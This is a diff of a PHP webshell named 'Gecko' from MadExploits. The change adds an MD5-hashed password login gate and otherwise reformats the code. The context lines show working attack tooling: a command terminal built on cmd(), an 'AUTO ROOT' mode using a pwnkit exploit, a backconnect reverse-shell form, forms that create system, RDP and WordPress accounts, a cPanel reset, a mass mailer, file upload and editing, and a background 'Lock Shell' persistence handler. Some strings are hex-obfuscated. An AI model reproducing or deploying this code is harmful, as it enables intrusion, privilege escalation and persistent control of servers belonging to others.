@@ -97,7 +97,35 @@ function download($file)
 if ($_GET['don'] == true) {
     $FilesDon = download(unx($_GET['don']));
 }
+
+session_start();
+
+// Define username and password
+$password = 'eb288932ab6df9764a844178bff39eec';
+
+// Handle login form submission
+if (isset($_POST['login'])) {
+    if ((md5($_POST['password'])) === $password) {
+        $_SESSION['authenticated'] = true;
+    } else {
+        echo "Invalid credentials.";
+    }
+}
+
+// If the user is not authenticated, display the login form
+if (!isset($_SESSION['authenticated'])) {
+    ?>
+    <form method="post">
+        Password: <input type="password" name="password" required><br>
+        <button type="submit" name="login">Masuk</button>
+    </form>
+    <?php
+    exit;
+}
+
+// Place your webshell code here
 ?>
+
 <!DOCTYPE html>
 <html lang="en">
 
@@ -110,7 +138,9 @@ if ($_GET['don'] == true) {
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/codemirror.min.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/theme/ayu-mirage.min.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/addon/hint/show-hint.min.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha512-Kc323vGBEqzTmouAECnVceyQqyqdsSiqLQISBL29aUW4U/M7pSPA/gEUZQqv1cwx4OnYxTxve5UMg5GT6L4JJg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css"
+        integrity="sha512-Kc323vGBEqzTmouAECnVceyQqyqdsSiqLQISBL29aUW4U/M7pSPA/gEUZQqv1cwx4OnYxTxve5UMg5GT6L4JJg=="
+        crossorigin="anonymous" referrerpolicy="no-referrer" />
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
     <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/codemirror.min.js"></script>
@@ -543,36 +573,60 @@ if ($_GET['don'] == true) {
     <div class="menu-header">
         <ul>
             <li><i class="fa-solid fa-computer"></i>&nbsp;<?= $fungsi[8](); ?></li>
-            <li><i class="fa-solid fa-server"></i>&nbsp;<?= $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x53\x4f\x46\x54\x57\x41\x52\x45"]; ?></li>
-            <li><i class="fa-solid fa-network-wired"></i>&nbsp;: <?= gethostbyname($_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x41\x44\x44\x52"]); ?> |&nbsp;: <?= $_SERVER["\x52\x45\x4d\x4f\x54\x45\x5f\x41\x44\x44\x52"]; ?></li>
+            <li><i
+                    class="fa-solid fa-server"></i>&nbsp;<?= $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x53\x4f\x46\x54\x57\x41\x52\x45"]; ?>
+            </li>
+            <li><i class="fa-solid fa-network-wired"></i>&nbsp;:
+                <?= gethostbyname($_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x41\x44\x44\x52"]); ?> |&nbsp;:
+                <?= $_SERVER["\x52\x45\x4d\x4f\x54\x45\x5f\x41\x44\x44\x52"]; ?>
+            </li>
             <li><i class="fa-solid fa-globe"></i>&nbsp;<?= s(); ?></li>
             <li><i class="fa-brands fa-php"></i>&nbsp;<?= PHP_VERSION; ?></li>
             <li><i class="fa-solid fa-user"></i>&nbsp;<?= $fungsi[9](); ?></li>
             <li><i class="fa-brands fa-github"></i>&nbsp;www.github.com/MadExploits</li>
-            <li class="logo-gecko"><img width="400" height="400" src="//raw.githubusercontent.com/MadExploits/Gecko/main/gecko1.png" align="right"></li>
-            <form action="" method="post" enctype='<?= "\x6d\x75\x6c\x74\x69\x70\x61\x72\x74\x2f\x66\x6f\x72\x6d\x2d\x64\x61\x74\x61"; ?>'>
-                <li class="form-upload"><input type="submit" value="Upload" name="gecko-up-submit" class="btn-submit">&nbsp;<input type="file" name="gecko-upload" class="form-file"></li>
+            <li class="logo-gecko"><img width="400" height="400"
+                    src="//raw.githubusercontent.com/MadExploits/Gecko/main/gecko1.png" align="right"></li>
+            <form action="" method="post"
+                enctype='<?= "\x6d\x75\x6c\x74\x69\x70\x61\x72\x74\x2f\x66\x6f\x72\x6d\x2d\x64\x61\x74\x61"; ?>'>
+                <li class="form-upload"><input type="submit" value="Upload" name="gecko-up-submit"
+                        class="btn-submit">&nbsp;<input type="file" name="gecko-upload" class="form-file"></li>
             </form>
         </ul>
     </div>
     <div class="menu-tools">
         <ul>
-            <li><a href="?d=<?= hx($fungsi[0]()) ?>&terminal=normal" class="btn-submit"><i class="fa-solid fa-terminal"></i> Terminal</a></li>
-            <li><a href="?d=<?= hx($fungsi[0]()) ?>&terminal=root" class="btn-submit badge-root"><i class="fa-solid fa-user-lock"></i> AUTO ROOT</a></li>
-            <li><a href="?d=<?= hx($fungsi[0]()) ?>&adminer" class="btn-submit"><i class="fa-solid fa-database"></i> Adminer</a></li>
-            <li><a href="?d=<?= hx($fungsi[0]()) ?>&destroy" class="btn-submit"><i class="fa-solid fa-ghost"></i> Backdoor Destroyer</a></li>
-            <li><a href="//www.exploit-db.com/search?q=Linux%20Kernel%20<?= suggest_exploit(); ?>" class="btn-submit"><i class="fa-solid fa-flask"></i> Linux Exploit</a></li>
-            <li><a href="?d=<?= hx($fungsi[0]()) ?>&lockshell" class="btn-submit"><i class="fa-brands fa-linux"></i> Lock Shell</a></li>
-            <li><a href="" class="btn-submit badge-linux" id="lock-file"><i class="fa-brands fa-linux"></i> Lock File</a></li>
-            <li><a href="" class="btn-submit badge-root" id="root-user"><i class="fa-solid fa-user-plus"></i> Create User</a></li>
-            <li><a href="" class="btn-submit" id="create-rdp"><i class="fa-solid fa-laptop-file"></i> CREATE RDP</a></li>
-            <li><a href="?d=<?= hx($fungsi[0]()) ?>&mailer" class="btn-submit"><i class="fa-solid fa-envelope"></i> PHP Mailer</a></li>
-            <li><a href="?d=<?= hx($fungsi[0]()) ?>&backconnect" class="btn-submit"><i class="fa-solid fa-user-secret"></i> BACKCONNECT</a></li>
-            <li><a href="?d=<?= hx($fungsi[0]()) ?>&unlockshell" class="btn-submit"><i class="fa-solid fa-unlock-keyhole"></i> UNLOCK SHELL</a></li>
-            <li><a href="//hashes.com/en/tools/hash_identifier" class="btn-submit"><i class="fa-solid fa-code"></i> HASH IDENTIFIER</a></li>
-            <li><a href="?d=<?= hx($fungsi[0]()) ?>&cpanelreset" class="btn-submit"><i class="fa-brands fa-cpanel"></i> CPANEL RESET</a></li>
-            <li><a href="?d=<?= hx($fungsi[0]()) ?>&createwp" class="btn-submit"><i class="fa-brands fa-wordpress-simple"></i> CREATE WP USER</a></li>
-            <li><a href="//github.com/MadExploits/" class="btn-submit"><i class="fa-solid fa-link"></i>&nbsp;README</a></li>
+            <li><a href="?d=<?= hx($fungsi[0]()) ?>&terminal=normal" class="btn-submit"><i
+                        class="fa-solid fa-terminal"></i> Terminal</a></li>
+            <li><a href="?d=<?= hx($fungsi[0]()) ?>&terminal=root" class="btn-submit badge-root"><i
+                        class="fa-solid fa-user-lock"></i> AUTO ROOT</a></li>
+            <li><a href="?d=<?= hx($fungsi[0]()) ?>&adminer" class="btn-submit"><i class="fa-solid fa-database"></i>
+                    Adminer</a></li>
+            <li><a href="?d=<?= hx($fungsi[0]()) ?>&destroy" class="btn-submit"><i class="fa-solid fa-ghost"></i>
+                    Backdoor Destroyer</a></li>
+            <li><a href="//www.exploit-db.com/search?q=Linux%20Kernel%20<?= suggest_exploit(); ?>" class="btn-submit"><i
+                        class="fa-solid fa-flask"></i> Linux Exploit</a></li>
+            <li><a href="?d=<?= hx($fungsi[0]()) ?>&lockshell" class="btn-submit"><i class="fa-brands fa-linux"></i>
+                    Lock Shell</a></li>
+            <li><a href="" class="btn-submit badge-linux" id="lock-file"><i class="fa-brands fa-linux"></i> Lock
+                    File</a></li>
+            <li><a href="" class="btn-submit badge-root" id="root-user"><i class="fa-solid fa-user-plus"></i> Create
+                    User</a></li>
+            <li><a href="" class="btn-submit" id="create-rdp"><i class="fa-solid fa-laptop-file"></i> CREATE RDP</a>
+            </li>
+            <li><a href="?d=<?= hx($fungsi[0]()) ?>&mailer" class="btn-submit"><i class="fa-solid fa-envelope"></i> PHP
+                    Mailer</a></li>
+            <li><a href="?d=<?= hx($fungsi[0]()) ?>&backconnect" class="btn-submit"><i
+                        class="fa-solid fa-user-secret"></i> BACKCONNECT</a></li>
+            <li><a href="?d=<?= hx($fungsi[0]()) ?>&unlockshell" class="btn-submit"><i
+                        class="fa-solid fa-unlock-keyhole"></i> UNLOCK SHELL</a></li>
+            <li><a href="//hashes.com/en/tools/hash_identifier" class="btn-submit"><i class="fa-solid fa-code"></i> HASH
+                    IDENTIFIER</a></li>
+            <li><a href="?d=<?= hx($fungsi[0]()) ?>&cpanelreset" class="btn-submit"><i class="fa-brands fa-cpanel"></i>
+                    CPANEL RESET</a></li>
+            <li><a href="?d=<?= hx($fungsi[0]()) ?>&createwp" class="btn-submit"><i
+                        class="fa-brands fa-wordpress-simple"></i> CREATE WP USER</a></li>
+            <li><a href="//github.com/MadExploits/" class="btn-submit"><i class="fa-solid fa-link"></i>&nbsp;README</a>
+            </li>
         </ul>
     </div>
 
@@ -599,11 +653,13 @@ if ($_GET['don'] == true) {
                     echo '&nbsp;<a href="?d=' . hx('/') . '"><i class="fa-solid fa-folder-plus"></i>&nbsp;/ </a>';
                     continue;
                 }
-                if ($val == '') continue;
+                if ($val == '')
+                    continue;
                 echo '<a href="?d=';
                 for ($i = 0; $i <= $id; $i++) {
                     echo hx($pwd[$i]);
-                    if ($i != $id) echo hx("/");
+                    if ($i != $id)
+                        echo hx("/");
                 }
                 echo '">' . $val . ' / ' . '</a>';
             }
@@ -623,10 +679,12 @@ if ($_GET['don'] == true) {
             <form action="" method="post">
                 <tbody>
                     <!-- Gecko Folder File Manager -->
-                    <?php foreach ($file_manager as $_D) : ?>
-                        <?php if ($fungsi[2]($_D)) : ?>
+                    <?php foreach ($file_manager as $_D): ?>
+                        <?php if ($fungsi[2]($_D)): ?>
                             <tr>
-                                <td><input type="checkbox" name="check[]" value="<?= $_D ?>">&nbsp;<i class="fa-solid fa-folder-open" style="color:orange;"></i>&nbsp;<a href="?d=<?= hx($fungsi[0]() . "/" . $_D); ?>"><?= namaPanjang($_D); ?></a></td>
+                                <td><input type="checkbox" name="check[]" value="<?= $_D ?>">&nbsp;<i
+                                        class="fa-solid fa-folder-open" style="color:orange;"></i>&nbsp;<a
+                                        href="?d=<?= hx($fungsi[0]() . "/" . $_D); ?>"><?= namaPanjang($_D); ?></a></td>
                                 <td>[ DIR ]</td>
                                 <td>
                                     <?php if ($fungsi[4]($fungsi[0]() . '/' . $_D)) {
@@ -638,15 +696,20 @@ if ($_GET['don'] == true) {
                                     ?>
                                 </td>
                                 <!-- Action Folder Manager -->
-                                <td><a href="?d=<?= hx($fungsi[0]()); ?>&re=<?= hx($_D) ?>" class="badge-action-editor"><i class="fa-solid fa-pen-to-square"></i></a>&nbsp;<a href="?d=<?= hx($fungsi[0]()); ?>&ch=<?= hx($_D) ?>" class="badge-action-chmod"><i class="fa-solid fa-user-pen"></i></a></td>
+                                <td><a href="?d=<?= hx($fungsi[0]()); ?>&re=<?= hx($_D) ?>" class="badge-action-editor"><i
+                                            class="fa-solid fa-pen-to-square"></i></a>&nbsp;<a
+                                        href="?d=<?= hx($fungsi[0]()); ?>&ch=<?= hx($_D) ?>" class="badge-action-chmod"><i
+                                            class="fa-solid fa-user-pen"></i></a></td>
                             </tr>
                         <?php endif; ?>
                     <?php endforeach; ?>
                     <!-- Gecko Files Manager -->
-                    <?php foreach ($file_manager as $_F) : ?>
-                        <?php if ($fungsi[3]($_F)) : ?>
+                    <?php foreach ($file_manager as $_F): ?>
+                        <?php if ($fungsi[3]($_F)): ?>
                             <tr>
-                                <td><input type="checkbox" name="check[]" value="<?= $_F ?>">&nbsp;<?= file_ext($_F) ?>&nbsp;<a href="?d=<?= hx($fungsi[0]()); ?>&f=<?= hx($_F); ?>" class="gecko-files"><?= namaPanjang($_F); ?></a></td>
+                                <td><input type="checkbox" name="check[]" value="<?= $_F ?>">&nbsp;<?= file_ext($_F) ?>&nbsp;<a
+                                        href="?d=<?= hx($fungsi[0]()); ?>&f=<?= hx($_F); ?>"
+                                        class="gecko-files"><?= namaPanjang($_F); ?></a></td>
                                 <td><?= formatSize(filesize($_F)); ?></td>
                                 <td>
                                     <?php if (is_writable($fungsi[0]() . '/' . $_D)) {
@@ -658,7 +721,12 @@ if ($_GET['don'] == true) {
                                     ?>
                                 </td>
                                 <!-- Action File Manager -->
-                                <td><a href="?d=<?= hx($fungsi[0]()); ?>&re=<?= hx($_F) ?>" class="badge-action-editor"><i class="fa-solid fa-pen-to-square"></i></a>&nbsp;<a href="?d=<?= hx($fungsi[0]()); ?>&ch=<?= hx($_F) ?>" class="badge-action-chmod"><i class="fa-solid fa-user-pen"></i></a>&nbsp;<a href="?d=<?= hx($fungsi[0]()); ?>&don=<?= hx($_F) ?>" class="badge-action-download"><i class="fa-solid fa-download"></i></a></td>
+                                <td><a href="?d=<?= hx($fungsi[0]()); ?>&re=<?= hx($_F) ?>" class="badge-action-editor"><i
+                                            class="fa-solid fa-pen-to-square"></i></a>&nbsp;<a
+                                        href="?d=<?= hx($fungsi[0]()); ?>&ch=<?= hx($_F) ?>" class="badge-action-chmod"><i
+                                            class="fa-solid fa-user-pen"></i></a>&nbsp;<a
+                                        href="?d=<?= hx($fungsi[0]()); ?>&don=<?= hx($_F) ?>" class="badge-action-download"><i
+                                            class="fa-solid fa-download"></i></a></td>
                             </tr>
                         <?php endif; ?>
                     <?php endforeach; ?>
@@ -684,14 +752,16 @@ if ($_GET['don'] == true) {
                         <div id="modal-body-bc"></div>
                         <span id="modal-input"></span>
                         <div class="modal-btn-form">
-                            <input type="submit" name="submit" value="Submit" class="btn-modal-close box-shadow">&nbsp;<button class="btn-modal-close box-shadow" id="close-modal">Close</button>
+                            <input type="submit" name="submit" value="Submit"
+                                class="btn-modal-close box-shadow">&nbsp;<button class="btn-modal-close box-shadow"
+                                id="close-modal">Close</button>
                         </div>
                 </form>
             </div>
         </div>
     </div>
     </div>
-    <?php if (isset($_GET['cpanelreset'])) : ?>
+    <?php if (isset($_GET['cpanelreset'])): ?>
         <div class="modal active">
             <div class="modal-container">
                 <div class="modal-header">
@@ -701,16 +771,18 @@ if ($_GET['don'] == true) {
                     <div class="modal-body">
                         <div class="modal-isi">
                             <form action="" method="post">
-                                <input type="email" name="resetcp" class="modal-create-input" placeholder="Your email : example@mail.com">
+                                <input type="email" name="resetcp" class="modal-create-input"
+                                    placeholder="Your email : example@mail.com">
                         </div>
                         <div class="modal-btn-form">
-                            <input type="submit" name="submit" value="Submit" class="btn-modal-close box-shadow">&nbsp;<a class="btn-modal-close box-shadow" href="?d=<?= hx($fungsi[0]()) ?>">Close</a>
+                            <input type="submit" name="submit" value="Submit" class="btn-modal-close box-shadow">&nbsp;<a
+                                class="btn-modal-close box-shadow" href="?d=<?= hx($fungsi[0]()) ?>">Close</a>
                         </div>
                 </form>
             </div>
         </div>
     <?php endif; ?>
-    <?php if (isset($_GET['createwp'])) : ?>
+    <?php if (isset($_GET['createwp'])): ?>
         <div class="modal active">
             <div class="modal-container">
                 <div class="modal-header">
@@ -728,7 +800,8 @@ if ($_GET['don'] == true) {
                                 <br><br>
                                 <input type="text" name="db_password" class="modal-create-input" placeholder="DB_PASSWORD">
                                 <br><br>
-                                <input type="text" name="db_host" class="modal-create-input" placeholder="DB_HOST" value="127.0.0.1">
+                                <input type="text" name="db_host" class="modal-create-input" placeholder="DB_HOST"
+                                    value="127.0.0.1">
                                 <br><br>
                                 <hr size="2" color="black" style="margin:0px 30px; border-radius:3px;">
                                 <br><br>
@@ -738,13 +811,14 @@ if ($_GET['don'] == true) {
                                 <br><br>
                         </div>
                         <div class="modal-btn-form">
-                            <input type="submit" name="submitwp" value="Submit" class="btn-modal-close box-shadow">&nbsp;<a class="btn-modal-close box-shadow" href="?d=<?= hx($fungsi[0]()) ?>">Close</a>
+                            <input type="submit" name="submitwp" value="Submit" class="btn-modal-close box-shadow">&nbsp;<a
+                                class="btn-modal-close box-shadow" href="?d=<?= hx($fungsi[0]()) ?>">Close</a>
                         </div>
                 </form>
             </div>
         </div>
     <?php endif; ?>
-    <?php if (isset($_GET['backconnect'])) : ?>
+    <?php if (isset($_GET['backconnect'])): ?>
         <div class="modal active">
             <div class="modal-container">
                 <div class="modal-header">
@@ -768,13 +842,14 @@ if ($_GET['don'] == true) {
                         <br><br>
                         <input type="number" name="backconnect-port" class="modal-create-input" placeholder="1337">
                         <div class="modal-btn-form">
-                            <input type="submit" name="submit-bc" value="Submit" class="btn-modal-close box-shadow">&nbsp;<a class="btn-modal-close box-shadow" href="?d=<?= hx($fungsi[0]()) ?>">Close</a>
+                            <input type="submit" name="submit-bc" value="Submit" class="btn-modal-close box-shadow">&nbsp;<a
+                                class="btn-modal-close box-shadow" href="?d=<?= hx($fungsi[0]()) ?>">Close</a>
                         </div>
                 </form>
             </div>
         </div>
     <?php endif; ?>
-    <?php if (isset($_GET['mailer'])) : ?>
+    <?php if (isset($_GET['mailer'])): ?>
         <div class="modal active">
             <div class="modal-container">
                 <div class="modal-header">
@@ -785,23 +860,27 @@ if ($_GET['don'] == true) {
                         <div class="modal-isi">
                             <form action="" method="post">
                                 <div class="modal-mail-text">
-                                    <textarea name="message-smtp" class="box-shadow mail" placeholder="&nbsp;Your Text here!"></textarea>
+                                    <textarea name="message-smtp" class="box-shadow mail"
+                                        placeholder="&nbsp;Your Text here!"></textarea>
                                 </div>
                                 <br>
                                 <input type="text" name="mailto-subject" class="modal-create-input" placeholder="Subject">
                                 <br><br>
-                                <input type="email" name="mail-from-smtp" class="modal-create-input" placeholder="from : example@mail.com">
+                                <input type="email" name="mail-from-smtp" class="modal-create-input"
+                                    placeholder="from : example@mail.com">
                                 <br><br>
-                                <input type="email" name="mail-to-smtp" class="modal-create-input" placeholder="to : example@mail.com">
+                                <input type="email" name="mail-to-smtp" class="modal-create-input"
+                                    placeholder="to : example@mail.com">
                         </div>
                         <div class="modal-btn-form">
-                            <input type="submit" name="submit" value="Submit" class="btn-modal-close box-shadow">&nbsp;<a class="btn-modal-close box-shadow" href="?d=<?= hx($fungsi[0]()) ?>">Close</a>
+                            <input type="submit" name="submit" value="Submit" class="btn-modal-close box-shadow">&nbsp;<a
+                                class="btn-modal-close box-shadow" href="?d=<?= hx($fungsi[0]()) ?>">Close</a>
                         </div>
                 </form>
             </div>
         </div>
     <?php endif; ?>
-    <?php if ($_GET['f']) : ?>
+    <?php if ($_GET['f']): ?>
         <div class="code-editor">
             <div class="code-editor-container">
                 <div class="code-editor-head">
@@ -809,16 +888,18 @@ if ($_GET['don'] == true) {
                 </div>
                 <div class="code-editor-body">
                     <form action="" method="post">
-                        <textarea name="code-editor" id="code" class="box-shadow" autofocus><?= $fungsi[10]($fungsi[11]($fungsi[0]() . "/" . unx($_GET['f']))); ?></textarea>
+                        <textarea name="code-editor" id="code" class="box-shadow"
+                            autofocus><?= $fungsi[10]($fungsi[11]($fungsi[0]() . "/" . unx($_GET['f']))); ?></textarea>
                         <div class="modal-btn-form">
-                            <input type="submit" name="save-editor" value="Save" class="btn-modal-close">&nbsp;<button class="btn-modal-close" id="close-editor">Close</button>
+                            <input type="submit" name="save-editor" value="Save" class="btn-modal-close">&nbsp;<button
+                                class="btn-modal-close" id="close-editor">Close</button>
                         </div>
                     </form>
                 </div>
             </div>
         </div>
     <?php endif; ?>
-    <?php if ($_GET['terminal'] == "normal") : ?>
+    <?php if ($_GET['terminal'] == "normal"): ?>
         <div class="terminal">
             <div class="terminal-container">
                 <div class="terminal-head">
@@ -829,13 +910,15 @@ if ($_GET['don'] == true) {
                 </div>
                 <div class="terminal-body">
                     <textarea class="box-shadow" disabled><?php
-                                                            if (isset($_POST['terminal'])) {
-                                                                echo $fungsi[10](cmd($_POST['terminal-text'] . " 2>&1"));
-                                                            }
-                                                            ?></textarea>
+                    if (isset($_POST['terminal'])) {
+                        echo $fungsi[10](cmd($_POST['terminal-text'] . " 2>&1"));
+                    }
+                    ?></textarea>
                     <form action="" method="post">
                         <ul>
-                            <li><input type="text" name="terminal-text" class="terminal-input box-shadow" placeholder="<?= $fungsi[9]() . "@" . $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x41\x44\x44\x52"]; ?>" autofocus></li>
+                            <li><input type="text" name="terminal-text" class="terminal-input box-shadow"
+                                    placeholder="<?= $fungsi[9]() . "@" . $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x41\x44\x44\x52"]; ?>"
+                                    autofocus></li>
                             <li><input type="submit" name="terminal" value=">" class="btn-modal-close"></li>
                         </ul>
                     </form>
@@ -843,7 +926,7 @@ if ($_GET['don'] == true) {
             </div>
         </div>
     <?php endif; ?>
-    <?php if ($_GET['terminal'] == "root") : ?>
+    <?php if ($_GET['terminal'] == "root"): ?>
         <div class="terminal">
             <div class="terminal-container">
                 <div class="terminal-head">
@@ -854,23 +937,25 @@ if ($_GET['don'] == true) {
                 </div>
                 <div class="terminal-body">
                     <textarea name="" disabled><?php if ($fungsi[3]('.mad-root') && $fungsi[3]('pwnkit')) {
-                                                    $response = $fungsi[11]('.mad-root');
-                                                    $r_text = explode(" ", $response);
-                                                    if ($r_text[0] == "uid=0(root)") {
-                                                        if (isset($_POST['submit-root'])) {
-                                                            echo cmd('./pwnkit "' . $_POST['root-terminal'] . '  2>&1"');
-                                                        }
-                                                    } else {
-                                                        echo "This Device Is Not Vulnerable\n";
-                                                        echo cmd('cat /etc/os-release') . "\n";
-                                                        echo "Kernel Version : " . suggest_exploit() . "\n";
-                                                    }
-                                                } else {
-                                                    $fungsi[24]('.mad-root');
-                                                } ?></textarea>
+                        $response = $fungsi[11]('.mad-root');
+                        $r_text = explode(" ", $response);
+                        if ($r_text[0] == "uid=0(root)") {
+                            if (isset($_POST['submit-root'])) {
+                                echo cmd('./pwnkit "' . $_POST['root-terminal'] . '  2>&1"');
+                            }
+                        } else {
+                            echo "This Device Is Not Vulnerable\n";
+                            echo cmd('cat /etc/os-release') . "\n";
+                            echo "Kernel Version : " . suggest_exploit() . "\n";
+                        }
+                    } else {
+                        $fungsi[24]('.mad-root');
+                    } ?></textarea>
                     <form action="" method="post">
                         <ul>
-                            <li><input type="text" name="root-terminal" class="terminal-input" placeholder="<?= "root" . "@" . $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x41\x44\x44\x52"]; ?>" autofocus></li>
+                            <li><input type="text" name="root-terminal" class="terminal-input"
+                                    placeholder="<?= "root" . "@" . $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x41\x44\x44\x52"]; ?>"
+                                    autofocus></li>
                             <li><input type="submit" name="submit-root" value=">" class="btn-modal-close"></li>
                         </ul>
                     </form>
@@ -878,7 +963,7 @@ if ($_GET['don'] == true) {
             </div>
         </div>
     <?php endif; ?>
-    <?php if ($_GET['re'] == true) : ?>
+    <?php if ($_GET['re'] == true): ?>
         <div class="modal active">
             <div class="modal-container">
                 <div class="modal-header">
@@ -886,9 +971,12 @@ if ($_GET['don'] == true) {
                 </div>
                 <div class="modal-body">
                     <form action="" method="post">
-                        <span id="modal-input"><input type="text" name="renameFile" class="modal-create-input" placeholder="Rename"></span>
+                        <span id="modal-input"><input type="text" name="renameFile" class="modal-create-input"
+                                placeholder="Rename"></span>
                         <div class="modal-btn-form">
-                            <input type="submit" name="submit" value="Submit" class="btn-modal-close box-shadow">&nbsp;<button class="btn-modal-close box-shadow close-btn-s">Close</button>
+                            <input type="submit" name="submit" value="Submit"
+                                class="btn-modal-close box-shadow">&nbsp;<button
+                                class="btn-modal-close box-shadow close-btn-s">Close</button>
                         </div>
                     </form>
                 </div>
@@ -896,7 +984,7 @@ if ($_GET['don'] == true) {
         </div>
         </div>
     <?php endif; ?>
-    <?php if ($_GET['ch'] == true) : ?>
+    <?php if ($_GET['ch'] == true): ?>
         <div class="modal active">
             <div class="modal-container">
                 <div class="modal-header">
@@ -904,9 +992,12 @@ if ($_GET['don'] == true) {
                 </div>
                 <div class="modal-body">
                     <form action="" method="post">
-                        <span id="modal-input"><input type="number" name="chFile" class="modal-create-input" placeholder="0775"></span>
+                        <span id="modal-input"><input type="number" name="chFile" class="modal-create-input"
+                                placeholder="0775"></span>
                         <div class="modal-btn-form">
-                            <input type="submit" name="submit" value="Submit" class="btn-modal-close box-shadow">&nbsp;<button class="btn-modal-close box-shadow close-btn-s">Close</button>
+                            <input type="submit" name="submit" value="Submit"
+                                class="btn-modal-close box-shadow">&nbsp;<button
+                                class="btn-modal-close box-shadow close-btn-s">Close</button>
                         </div>
                     </form>
                 </div>
@@ -915,55 +1006,55 @@ if ($_GET['don'] == true) {
         </div>
     <?php endif; ?>
     <script>
-        $(document).ready(function() {
+        $(document).ready(function () {
 
 
-            $('#create_folder').click(function() {
+            $('#create_folder').click(function () {
                 $('.modal').show();
                 $('#modal-title').html('<i class="fa-solid fa-folder-plus"></i>&nbsp;Create Folder');
                 $('#modal-input').html('<input type="text" name="create_folder" class="modal-create-input" placeholder="Create Folder">');
                 event.preventDefault();
             });
-            $('#create_file').click(function() {
+            $('#create_file').click(function () {
                 $('.modal').show();
                 $('#modal-title').html('<i class="fa-solid fa-file-circle-plus"></i>&nbsp;Create File');
                 $('#modal-input').html('<input type="text" name="create_file" class="modal-create-input" placeholder="Create File">');
                 event.preventDefault();
             });
-            $('#lock-file').click(function() {
+            $('#lock-file').click(function () {
                 $('.modal').show();
                 $('#modal-title').html('<i class="fa-solid fa-lock"></i>&nbsp;LOCK FILE');
                 $('#modal-input').html('<input type="text" name="lockfile" class="modal-create-input" placeholder="Your File Name">');
                 event.preventDefault();
             });
-            $('#root-user').click(function() {
+            $('#root-user').click(function () {
                 $('.modal').show();
                 $('#modal-title').html('<i class="fa-solid fa-user-plus"></i>&nbsp;ADD USER');
                 $('#modal-input').html('<input type="text" name="add-username" class="modal-create-input" placeholder="Username"><br><br><input type="text" name="add-password" class="modal-create-input" placeholder="Password">');
                 event.preventDefault();
             });
 
-            $('#create-rdp').click(function() {
+            $('#create-rdp').click(function () {
                 $('.modal').show();
                 $('#modal-title').html(':: CREATE RDP');
                 $('#modal-input').html('<input type="text" name="add-rdp" class="modal-create-input" placeholder="Username"><br><br><input type="text" name="add-rdp-pass" class="modal-create-input" placeholder="Password">');
                 event.preventDefault();
             });
 
-            $('#close-modal').click(function() {
+            $('#close-modal').click(function () {
                 $('.modal').hide();
                 event.preventDefault();
             });
-            $('#close-editor').click(function() {
+            $('#close-editor').click(function () {
                 $('.code-editor').hide();
                 event.preventDefault();
             });
 
-            $('.close-terminal').click(function() {
+            $('.close-terminal').click(function () {
                 $('.terminal').hide();
                 event.preventDefault();
             });
-            $('.close-btn-s').click(function() {
+            $('.close-btn-s').click(function () {
                 $('.modal').hide();
                 event.preventDefault();
             });
@@ -1074,7 +1165,7 @@ if (isset($_POST['submit-bc'])) {
 if (isset($_GET['lockshell'])) {
     $curFile = trim(basename($_SERVER["\x53\x43\x52\x49\x50\x54\x5f\x46\x49\x4c\x45\x4e\x41\x4d\x45"]));
     $TmpNames = $fungsi[31]();
-    if (file_exists($TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($curFile)  . '-handler')) && file_exists($TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($curFile) . '-text'))) {
+    if (file_exists($TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($curFile) . '-handler')) && file_exists($TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($curFile) . '-text'))) {
         cmd('rm -rf ' . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($curFile) . '-text'));
         cmd('rm -rf ' . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($curFile) . '-handler'));
     }
@@ -1104,9 +1195,9 @@ function gecko_perm($flename){
     return substr(sprintf("%o", fileperms($flename)), -4);
 }
 ';
-    $hndlers = $fungsi[28]($TmpNames . "/.sessions/." . $fungsi[33]($fungsi[0]() . remove_dot($curFile)  . '-handler') . "", $handler);
+    $hndlers = $fungsi[28]($TmpNames . "/.sessions/." . $fungsi[33]($fungsi[0]() . remove_dot($curFile) . '-handler') . "", $handler);
     if ($hndlers) {
-        cmd(PHP_BINARY . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($curFile)  . '-handler') . ' > /dev/null 2>/dev/null &');
+        cmd(PHP_BINARY . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($curFile) . '-handler') . ' > /dev/null 2>/dev/null &');
         success();
     } else {
         failed();
@@ -1377,7 +1468,8 @@ function failed()
 function formatSize($bytes)
 {
     $types = array('<span class="file-size">B</span>', '<span class="file-size">KB</span>', '<span class="file-size">MB</span>', '<span class="file-size">GB</span>', '<span class="file-size">TB</span>');
-    for ($i = 0; $bytes >= 1024 && $i < (count($types) - 1); $bytes /= 1024, $i++);
+    for ($i = 0; $bytes >= 1024 && $i < (count($types) - 1); $bytes /= 1024, $i++)
+        ;
     return (round($bytes, 2) . " " . $types[$i]);
 }
 
@@ -1434,7 +1526,8 @@ function cmd($in, $re = false)
 {
     $out = '';
     try {
-        if ($re) $in = $in . " 2>&1";
+        if ($re)
+            $in = $in . " 2>&1";
         if (function_exists("\x65\x78\x65\x63")) {
